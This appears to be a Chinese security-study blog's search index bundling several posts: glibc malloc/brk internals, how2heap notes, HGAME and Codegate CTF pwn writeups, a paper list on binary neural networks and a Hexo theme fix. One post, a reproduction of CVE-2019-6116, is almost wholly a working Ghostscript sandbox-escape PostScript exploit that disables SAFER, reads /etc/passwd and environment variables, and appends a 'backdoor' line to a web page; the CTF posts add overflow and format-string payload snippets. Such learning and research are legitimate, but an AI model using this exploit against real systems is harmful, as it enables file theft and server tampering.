<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>调用Malloc后发生了什么</title>
      <link href="/2019/02/26/%E8%B0%83%E7%94%A8malloc%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/"/>
      <url>/2019/02/26/%E8%B0%83%E7%94%A8malloc%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p>malloc函数是用来进行内存分配的函数, 会在在堆上分配一段内存并返回地址</p><p>malloc是glibc函数, 实际上对应的系统调用是brk()函数</p><p>进程的地址空间:</p><p><img src="/2019/02/26/调用malloc后发生了什么/1.jpg" alt="img"></p><p>众所周知, 栈由高地址向低地址增加, 堆则从低地址向高地址增加</p><p>看一下<a href="https://www.cnblogs.com/shayu/p/3371880.html">brk和sbrk的用法</a>:</p><p>brk和sbrk提供底层的内存分配</p><p>共同维护一个系统指针, 用于对同类型的大块数据的动态存放</p><p>定义:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> *end_data_segment)</span></span>; <span class="comment">// 通过移动指针分配空间，释放空间</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">sbrk</span><span class="params">(<span class="keyword">ptrdiff_t</span> increment)</span></span>; <span class="comment">// 分配内存空间，返回指定大小空间的地址</span></span><br></pre></td></tr></table></figure></p><p>brk用法：</p><pre><code>对参数中end_data_segment做[绝对位置]调整，调动指针左右移动，左移-释放空间，右移-分配空间如果内存分配失败，二者都返回-1简而言之, brk可以指定堆的结束地址如当前堆结束地址是0x1000, 调用brk(0x2000), 那么堆结束地址就变成了0x2000, 堆块增加了0x1000的大小</code></pre><p>sbrk用法：</p><pre><code>第一次调用时，系统分配一大块空闲地址，把首地址返回，分配给一个指针phead，作为首地址不动；下一次调用时，返回当前位置的地址，分配给一个指针pnow，并把指针指向+increment的地方；sbrk的参数是一个相对地址, 即当前堆结束地址 + 参数, 并返回因此可以通过调用sbrk(0)的方式来获取当前堆结束地址</code></pre><p>例子:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *brk_end = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/*表示自己想扩展堆大小0字节</span></span><br><span class="line"><span class="comment">    *由于sbrk返回的是新的brk_end，所以sbrk(0)就能获取到当前</span></span><br><span class="line"><span class="comment">    *的brk_end</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">char</span> *p = sbrk(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"current brk end:%p\n"</span>,p);</span><br><span class="line">    <span class="comment">/*brk的入参是绝对地址，表示自己想要拓展brk_end至p+4096*/</span></span><br><span class="line">    brk(p+<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*再次尝试获取当前的brk_end*/</span></span><br><span class="line">    brk_end = sbrk(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"current brk end:%p\n"</span>,brk_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><pre><code>current brk end:0x98e000current brk end:0x98f000</code></pre><p>程序流程: <code>获取堆结束地址(sbrk(0)) -&gt; 拓展堆地址0x1000字节(brk(0x1000)) -&gt; 获取堆结束地址(sbrk(0))</code></p><p>显然只用sbrk也可以实现如上程序, 即用<code>sbrk(0x1000)</code>替换<code>brk(p + 0x1000)</code></p><p>如果是使用<code>brk(0x1000)</code>呢?</p><pre><code>$ gcc -o test1 test1.c test1.c: In function ‘main’:test1.c:8:15: warning: initialization makes pointer from integer without a cast     void *c = 0x1000;           ^$ ./test1 current brk end:0x1e5d000current brk end:0x1e7e000</code></pre><p>why?地址不应该是改到0x001000了吗?</p><pre><code>0x0000000000400605 in main ()gdb-peda$ current brk end:0x623000gdb-peda$ x/10gx 0x6020000x602000:    0x0000000000000000    0x00000000000004110x602010:    0x20746e6572727563    0x3a646e65206b72620x602020:    0x3030303332367830    0x000000000000000a0x602030:    0x0000000000000000    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000000gdb-peda$ x/10gx 0x6230000x623000:    Cannot access memory at address 0x623000</code></pre><p>可以看到调用brk(0x1000)后, 堆末地址会移动到一个不可读的地方<br>距离堆顶为<code>0x623000 - 0x602000 = 0x21000</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2月月赛记录</title>
      <link href="/2019/02/26/2%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/02/26/2%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>How2heap 学习记录</title>
      <link href="/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h1><p>how2heap 是由 shellphish 团队制作的堆利用教程，介绍了多种堆利用技术。使用 Ubuntu 16.04 64位系统环境，glibc 版本如下：</p><pre><code>$ file /lib/x86_64-linux-gnu/libc-2.23.so/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped</code></pre><p>从github clone文件夹下来</p><pre><code>$ git clone https://github.com/shellphish/how2heap.git$ cd how2heap$ make</code></pre><h1 id="0x02-堆分配机制-amp-malloc-amp-free"><a href="#0x02-堆分配机制-amp-malloc-amp-free" class="headerlink" title="0x02 堆分配机制 &amp; malloc &amp; free"></a>0x02 堆分配机制 &amp; malloc &amp; free</h1><p>在用malloc分配内存时, 程序向堆管理器发起请求</p><p>为了保持内存管理高效, 内核会预先分配一块内存给堆管理器, 堆空间不足时, 堆管理器向操作系统进行交互</p><h3 id="malloc-malloc-size-t-n"><a href="#malloc-malloc-size-t-n" class="headerlink" title="malloc: malloc(size_t n)"></a>malloc: <code>malloc(size_t n)</code></h3><ul><li>当<code>n=0</code>时, 返回操作系统允许的最小内存块</li><li>当<code>n&lt;0</code>时, 由于size_t是无符号整型, 因此会分配一个很大的内存(通常失败, 因为没有这么大内存)</li><li>正常情况下返回指定大小的内存的指针</li></ul><p>malloc本身是一个用户函数, 并没有真正和系统进行交互, 而是通过调用brk和sbrk以及mmap, munmap函数来操作</p><p><img src="/2019/02/26/how2heap-学习记录/1.jpg" alt="img"></p><p>图片来自<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview/#_4">ctfwiki</a></p><p>限于篇幅, 调用malloc后系统的操作将在另一篇文章里说明</p><h3 id="free-free-void-p"><a href="#free-free-void-p" class="headerlink" title="free: free(void* p)"></a>free: <code>free(void* p)</code></h3><ul><li>p=null时, free不做任何操作</li><li>p指向的内存如果被释放, 会造成各种影响 (glibc的原文说明:It can have arbitrary (i.e., bad!)effects if p has already been freed.)</li><li>除了在用mallopt限制了一些内存操作的情况下,当free很大的内存时, 会将这些内存直接返还给系统, 而不是交给堆管理器 </li></ul><h1 id="0x02-first-fit"><a href="#0x02-first-fit" class="headerlink" title="0x02 first_fit"></a>0x02 first_fit</h1><p>第一个程序展示了glibc的堆分配算法, 即first fit首次适应算法</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年2月总结</title>
      <link href="/2019/02/25/2019%E5%B9%B42%E6%9C%88%E6%80%BB%E7%BB%93/"/>
      <url>/2019/02/25/2019%E5%B9%B42%E6%9C%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>年前:</p><ol><li>用python完成了一个ctftime的爬虫, 可以指定题目类型, 通过对writeup搜索关键字来找某一类题(eg: fastbin attack)</li><li>搜集了ctftime上的fastbin attack类题目</li><li>参考UCAS Hcaking群的pwntutorialrevisit从头学pwn</li><li>做了一下Codegate CTF 2019的题目</li><li>完善了一下个人博客<br>年后:</li><li>复现了CVE-2019-6116(GhostScript), CVE-2018-20250~3(WinRAR)</li><li>做了HGAME CTF的pwn的部分题目, 对栈的各种花式利用做了一个更深的理解</li><li>简单研究了一下木马免杀</li><li>研究毕业设计(二进制深度神经网络的设计与实现), 找了一些论文和代码</li><li>月赛做了一下乙组的题, 甲组的re1(自动化逆向)研究了一下, 不会做, 其他题目看了一下</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-6116 GhostScript 沙箱绕过（命令执行）漏洞复现</title>
      <link href="/2019/02/20/CVE-2019-6116-GhostScript-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/02/20/CVE-2019-6116-GhostScript-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="refer"><a href="#refer" class="headerlink" title="refer:"></a>refer:</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p><h1 id="过程"><a href="#过程" class="headerlink" title="过程:"></a>过程:</h1><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC:"></a>PoC:</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%!PS</span><br><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span><br><span class="line">/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def</span><br><span class="line"></span><br><span class="line">/exploit &#123;</span><br><span class="line">    (Stage 11: Exploitation...) ==</span><br><span class="line"></span><br><span class="line">    /forceput exch def</span><br><span class="line"></span><br><span class="line">    systemdict /SAFER false forceput</span><br><span class="line">    systemdict /userparams get /PermitFileControl [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileWriting [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileReading [(*)] forceput</span><br><span class="line"></span><br><span class="line">    % All done.</span><br><span class="line">    stop</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">% setup an error handler to catch ifelse /stackoverflow</span><br><span class="line">errordict /stackoverflow &#123;</span><br><span class="line">    (Stage 10: /stackoverflow) ==</span><br><span class="line">    pop</span><br><span class="line">    % extract saved operand stack</span><br><span class="line">    0 get</span><br><span class="line">    % get the last parameter</span><br><span class="line">    dup dup length 1 sub get</span><br><span class="line">    (   Last Parameter:) ==only dup ==</span><br><span class="line">    (   Extracting .forceput...) ==</span><br><span class="line">    % This is the else operator to ifelse</span><br><span class="line">    5 get</span><br><span class="line">    % extract the .forceput</span><br><span class="line">    7 get</span><br><span class="line">    (   Result:) ==only dup ==</span><br><span class="line">    exploit</span><br><span class="line">&#125; put</span><br><span class="line"></span><br><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span><br><span class="line">% executable errays onto the operand stack that contain .forceput, but are not</span><br><span class="line">% marked as executeonly or pseudo-operators.</span><br><span class="line">%</span><br><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span><br><span class="line">% fail because when the routine was declared, it used `bind` but many of the</span><br><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span><br><span class="line">%</span><br><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span><br><span class="line">% works.</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /PDFfile        &#123; (Stage 0: PDFfile) == currentfile &#125;</span><br><span class="line">    /q              &#123; (Stage 1: q) == &#125; % no-op</span><br><span class="line">    /oget           &#123; (Stage 3: oget) == pop pop 0 &#125; % clear stack</span><br><span class="line">    /pdfemptycount  &#123; (Stage 4: pdfemptycount) == &#125; % no-op</span><br><span class="line">    /gput           &#123; (Stage 5: gput) == &#125;  % no-op</span><br><span class="line">    /resolvestream  &#123; (Stage 6: resolvestream) == &#125; % no-op</span><br><span class="line">    /pdfopdict      &#123; (Stage 7: pdfopdict) == &#125; % no-op</span><br><span class="line">    /.pdfruncontext &#123; (Stage 8: .pdfruncontext) == 0 1 mark &#125; % satisfy counttomark and index</span><br><span class="line">    /pdfdict        &#123; (Stage 9: pdfdict) ==</span><br><span class="line">        % fill the stack with junk to trigger a /stackoverflow</span><br><span class="line">        0 1 300051 &#123;&#125; for</span><br><span class="line">        % make sure .knownget doesnt screw up the stack</span><br><span class="line">        &lt;&lt; /.Qqwarning_issued true &gt;&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span><br><span class="line"></span><br><span class="line">(   Should now have complete control over ghostscript, attempting to read /etc/passwd...) ==</span><br><span class="line"></span><br><span class="line">% Demonstrate reading a file we shouldnt have access to.</span><br><span class="line">(/etc/passwd) (r) file dup 64 string readline pop == closefile</span><br><span class="line"></span><br><span class="line">% The getenv operator gets removed and we can&apos;t get it back, here is a</span><br><span class="line">% replacement.</span><br><span class="line">% (HOME) newgetenv (/path/to/home) true     % found</span><br><span class="line">% (foobar) newgetenv false                  % notfound</span><br><span class="line">/newgetenv &#123;</span><br><span class="line">    % read entire environment into string</span><br><span class="line">    (/proc/self/environ) (r) file dup 32768 string readstring pop exch closefile</span><br><span class="line"></span><br><span class="line">    % search for variable</span><br><span class="line">    exch dup (\0) exch concatstrings (=) concatstrings exch 3 1 roll search not &#123;</span><br><span class="line">        % not found, could be at the start, so no leading nul?</span><br><span class="line">        1 index (=) concatstrings anchorsearch not &#123;</span><br><span class="line">            (notfound)</span><br><span class="line">        &#125; &#123; pop &#125; ifelse</span><br><span class="line">    &#125; &#123; pop pop &#125; ifelse</span><br><span class="line"></span><br><span class="line">    % remove everything after path, there is always a nul on Linux.</span><br><span class="line">    (\0) search &#123; 4 1 roll pop pop pop true &#125; &#123;</span><br><span class="line">        % must be the notfound string</span><br><span class="line">        pop pop pop false</span><br><span class="line">    &#125; ifelse</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">% Here is how to edit .bashrc...</span><br><span class="line">/backdoorbash &#123;</span><br><span class="line">    % now we can append to bashrc</span><br><span class="line">    (HOME) newgetenv pop (/var/www/html/index.php) concatstrings (a) file dup</span><br><span class="line"></span><br><span class="line">    % backdoor</span><br><span class="line">    (echo pwned by postscript\n) writestring</span><br><span class="line"></span><br><span class="line">    % all done</span><br><span class="line">    closefile</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">backdoorbash</span><br><span class="line"></span><br><span class="line">(All Done) ==</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME CTF的pwn题 Writeup</title>
      <link href="/2019/02/19/HGAME-CTF%E7%9A%84pwn%E9%A2%98-writeup/"/>
      <url>/2019/02/19/HGAME-CTF%E7%9A%84pwn%E9%A2%98-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Week-1"><a href="#Week-1" class="headerlink" title="Week 1"></a>Week 1</h1><h2 id="babysc"><a href="#babysc" class="headerlink" title="babysc"></a>babysc</h2><p>ez</p><h2 id="aaaaaaaaaa"><a href="#aaaaaaaaaa" class="headerlink" title="aaaaaaaaaa"></a>aaaaaaaaaa</h2><p>ez</p><h2 id="薯片拯救世界1"><a href="#薯片拯救世界1" class="headerlink" title="薯片拯救世界1"></a>薯片拯救世界1</h2><h2 id="Steins-Gate"><a href="#Steins-Gate" class="headerlink" title="Steins;Gate"></a>Steins;Gate</h2><p>分别在以下位置打断点:</p><p>  b <em>0x400930     cmp     eax, 0x2333         # 第一关<br>  b </em>0x4009D5     sub     eax, 0x1234         # 第二关<br>  b *0x400A4C     cmp     [rbp+var_24], 6666h # 第三关</p><p>函数入口:<br>  b <em>0x4008F6<br>  b </em>0x400958<br>  b *0x400A00</p><p>welcome函数, 输入0x30个字节到bss段上</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Welcome to HGAME 2019,let us pwn4fun!"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's your ID:"</span>, <span class="number">4L</span>L);</span><br><span class="line">read(<span class="number">0</span>, &amp;unk_602040, <span class="number">0x30</span>uLL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You can get flag after your get the server's shell~"</span>);</span><br></pre></td></tr></table></figure><p>第一关, 存在溢出, 溢出buf到v2上覆盖v2的值位2333即可</p><p>测试0x30个字节可以填满, 后续四个字节写入0x2333</p><p><code>r.sendline(0x30*&#39;b&#39; + &#39;\x33\x23\x00\x00&#39;)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4008F6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"To seek the truth of the world."</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">128u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">0x2333</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到第二关</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> v4; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v4 = rand();</span><br><span class="line">v0 = v4;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Repeater is nature of man."</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>LL);</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You found it?"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x34</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v4 - <span class="number">0x1234</span> != v0 )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>v4是一个随机数, 无法预测, 利用格式化字符串漏洞读取v4的值</p><p><code>%7$p</code>: 64位程序, 函数调用的时候前6个参数是保存在寄存器的, 第七个参数在栈上,</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">               +-------------------+</span><br><span class="line">rbp - 0x50----&gt;+func2 rsp          |</span><br><span class="line">               |                   |</span><br><span class="line">               |                   |</span><br><span class="line">rbp - 0x44+---&gt;+                   +&lt;----------------------+random value</span><br><span class="line">               |                   |</span><br><span class="line">rbp - 0x40----&gt;+func1 rsp          +&lt;-----+func1 buf&lt;------+func2 buf</span><br><span class="line">               |                   |      ^                     ^</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">rbp - 0x30----&gt;+func3 rsp          |      |                     |</span><br><span class="line">               |                   |    0x16 * a              0x30 * a</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">rbp - 0x24+---&gt;+                   +&lt;----\x66\x66-----------------------------+\x66\x66</span><br><span class="line">               |                   |     \x00\x00               |</span><br><span class="line">rbp - 0x20+---&gt;+                   +&lt;-----+-----------------------------------+func3 buf</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      v                     v</span><br><span class="line">rbp - 0x10+---&gt;+                   +&lt;-----+\x33\x23&lt;--------+random ^alue</span><br><span class="line">               |                   |cannry+--------------------------------------------+</span><br><span class="line">               |                   |</span><br><span class="line">               |                   |</span><br><span class="line">               |                   |</span><br><span class="line">rbp+----------&gt;+-------------------+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制深度神经网络</title>
      <link href="/2019/02/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
      <url>/2019/02/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="papers"><a href="#papers" class="headerlink" title="papers:"></a>papers:</h1><p><a href="https://arxiv.org/pdf/1602.02830v3.pdf">https://arxiv.org/pdf/1602.02830v3.pdf</a></p><p><a href="http://www.csl.cornell.edu/~zhiruz/pdfs/bnn-fpga2017.pdf">http://www.csl.cornell.edu/~zhiruz/pdfs/bnn-fpga2017.pdf</a></p><p><a href="https://dl.acm.org/citation.cfm?doid=3020078.3021741">https://dl.acm.org/citation.cfm?doid=3020078.3021741</a></p><p><a href="https://arxiv.org/pdf/1808.00278.pdf">https://arxiv.org/pdf/1808.00278.pdf</a></p><p><a href="https://arxiv.org/abs/1711.11294">https://arxiv.org/abs/1711.11294</a><br><a href="https://dl.acm.org/citation.cfm?id=3240673">https://dl.acm.org/citation.cfm?id=3240673</a><br><a href="http://59.80.44.100/delivery.acm.org/10.1145/3310000/3302454/a42-Bai.pdf?ip=111.204.219.198&amp;id=3302454&amp;acc=ACTIVE%20SERVICE&amp;key=33E289E220520BFB%2E99E4F0382D256DD3%2E4D4702B0C3E38B35%2E4D4702B0C3E38B35&amp;__acm__=1550458147_b88e177851fe06d1a9d3bca94f9cf065">http://59.80.44.100/delivery.acm.org/10.1145/3310000/3302454/a42-Bai.pdf?ip=111.204.219.198&amp;id=3302454&amp;acc=ACTIVE%20SERVICE&amp;key=33E289E220520BFB%2E99E4F0382D256DD3%2E4D4702B0C3E38B35%2E4D4702B0C3E38B35&amp;__acm__=1550458147_b88e177851fe06d1a9d3bca94f9cf065</a><br><a href="https://dl.acm.org/citation.cfm?id=3129393">https://dl.acm.org/citation.cfm?id=3129393</a><br><a href="https://arxiv.org/abs/1602.02830">https://arxiv.org/abs/1602.02830</a><br><a href="https://arxiv.org/pdf/1808.00278.pdf">https://arxiv.org/pdf/1808.00278.pdf</a></p><h1 id="github"><a href="#github" class="headerlink" title="github:"></a>github:</h1><p><a href="https://github.com/cornell-zhang/bnn-fpga">https://github.com/cornell-zhang/bnn-fpga</a></p><p><a href="https://github.com/allenai/XNOR-Net">https://github.com/allenai/XNOR-Net</a></p><p><a href="https://github.com/MatthieuC">https://github.com/MatthieuC</a>    ourbariaux/BinaryNet</p><h1 id="other-refer"><a href="#other-refer" class="headerlink" title="other refer:"></a>other refer:</h1><p><a href="https://mp.weixin.qq.com/s/oumf8l28ijYLxc9fge0FMQ">https://mp.weixin.qq.com/s/oumf8l28ijYLxc9fge0FMQ</a></p><p><a href="https://mp.weixin.qq.com/s/tbRj5Wd69n9gvSzW4oKStg">https://mp.weixin.qq.com/s/tbRj5Wd69n9gvSzW4oKStg</a></p><p><a href="https://mp.weixin.qq.com/s/RsZCTqCKwpnjATUFC8da7g">https://mp.weixin.qq.com/s/RsZCTqCKwpnjATUFC8da7g</a></p><p><a href="https://www.chainnews.com/articles/477102982671.htm">https://www.chainnews.com/articles/477102982671.htm</a></p><h1 id="csdn"><a href="#csdn" class="headerlink" title="csdn"></a>csdn</h1><p><a href="https://blog.csdn.net/wangqingbaidu/article/details/52649775">https://blog.csdn.net/wangqingbaidu/article/details/52649775</a></p><p><a href="https://blog.csdn.net/qq_14845119/article/details/84346046">https://blog.csdn.net/qq_14845119/article/details/84346046</a></p><p><a href="https://blog.csdn.net/u014380165/article/details/77731595">https://blog.csdn.net/u014380165/article/details/77731595</a></p><p><a href="https://blog.csdn.net/stdcoutzyx/article/details/50926174">https://blog.csdn.net/stdcoutzyx/article/details/50926174</a></p><p><a href="https://blog.csdn.net/nature553863/article/details/80653521">https://blog.csdn.net/nature553863/article/details/80653521</a></p><p><a href="https://blog.csdn.net/yishuicanhong/column/info/23686">https://blog.csdn.net/yishuicanhong/column/info/23686</a></p><h1 id="methods"><a href="#methods" class="headerlink" title="methods"></a>methods</h1><p>XNOR-Net, Binary-Weight-Networks, BMXNet</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Cactus主题主页有滚动条的解决方法</title>
      <link href="/2019/01/27/hexo-cactus%E4%B8%BB%E9%A2%98%E4%B8%BB%E9%A1%B5%E6%9C%89%E6%BB%9A%E5%8A%A8%E6%9D%A1%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/01/27/hexo-cactus%E4%B8%BB%E9%A2%98%E4%B8%BB%E9%A1%B5%E6%9C%89%E6%BB%9A%E5%8A%A8%E6%9D%A1%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/2019/01/27/hexo-cactus主题主页有滚动条的解决方法/1.png" alt="img"></p><p>如图所示, cactus主题的hexo博客建立起来以后会有一个滚动条可以上下微微滚动, 本强迫症非常难受</p><p>搜了一波解决方案:</p><p><a href="https://www.thinkcss.com/css/921.shtml">https://www.thinkcss.com/css/921.shtml</a></p><pre><code>要实现最外层div高度为100%（百分之百关键对html和body要设置高度100%如果只设置html和body标签其中一个高100%，也是无法实现body内第一个盒子高度100%的。但由于body默认有一定margin值，但设置body高度height 100%后，浏览器就会出现滚动条，所以可以对body设置margin为零，去除间距实现div height 100%也无滚动条效果。</code></pre><p>打开hexo的文件夹, 在 <code>./themes/cactus/source/css/style.styl</code> 文件里</p><p>body下加一行 <code>margin: 0</code> 即可解决</p><p><img src="/2019/01/27/hexo-cactus主题主页有滚动条的解决方法/2.png" alt="img"></p><p><img src="/2019/01/27/hexo-cactus主题主页有滚动条的解决方法/3.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codegate CTF 2019</title>
      <link href="/2019/01/26/Codegate-CTF-2019/"/>
      <url>/2019/01/26/Codegate-CTF-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>base85一把梭</p><h1 id="KingMaker"><a href="#KingMaker" class="headerlink" title="KingMaker"></a>KingMaker</h1><h1 id="20000"><a href="#20000" class="headerlink" title="20000"></a>20000</h1><p>给了20k个.so文件, 然后用一个程序去调用, 分类一波以后一共如下四种:</p><ol><li>filter1<br> 过滤了;, *, |, &amp;, $, `, &gt;, &lt;, r</li><li>filter2<br> 过滤了v, m, p, d, n, bin, sh, bash, f, l, g     </li><li><p>test1</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"This is lib_100 file."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"How do you find vulnerable file?"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x32</span>uLL);</span><br><span class="line">system(<span class="string">"exit"</span>);</span><br></pre></td></tr></table></figure></li><li><p>test2<br> 用filter1和filter2过滤后, 执行system(“ls \”input\”)</p></li></ol><p>看起来似乎是命令注入</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis Oj Pwn 做题记录</title>
      <link href="/2019/01/24/jarvis-oj-pwn-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
